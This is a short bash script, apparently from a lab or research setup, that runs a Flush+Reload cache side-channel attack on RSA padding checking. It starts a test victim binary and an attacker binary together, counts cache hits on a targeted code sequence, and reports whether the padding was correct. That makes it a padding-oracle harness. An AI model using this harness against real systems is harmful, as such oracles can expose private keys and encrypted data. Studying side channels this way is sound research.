#!/bin/bash
VICTIM="testing/rsa"
ATTACKER="FRtester"
ITERATIONS=2000
INTERVAL=10
PADFLAG=1
TARGET="\x90\x90\x48\x8b\x45\xf8\x48\x89\xc7\xe8\xa5\xfd\xff\xff\xc9\xc3"


function sep_line {
	echo
	echo "-------------------------"
	echo
}

function run_victim {
	sleep 0.1
	echo "Initiating Victim"
	eval "$VICTIM 100 $PADFLAG"
}

function run_attacker {
	echo "Initiating Attacker"
	eval "$ATTACKER $VICTIM $'$TARGET' $INTERVAL $ITERATIONS"
	returnVal=$?
	if [ $returnVal -gt $ITERATIONS ]; then
		echo "Error occured"
		exit
	fi
	echo "[$returnVal/$ITERATIONS] accesses to targeted code identified"
	if [ $returnVal -gt 1 ]; then
		echo "Padding was incorrect"
	else
		echo "Padding was correct"
	fi
	echo
	echo
}

echo "-------------------------"
echo
echo "Setting Flush + Reload Attack on RSA padding"
sep_line
run_victim & run_attacker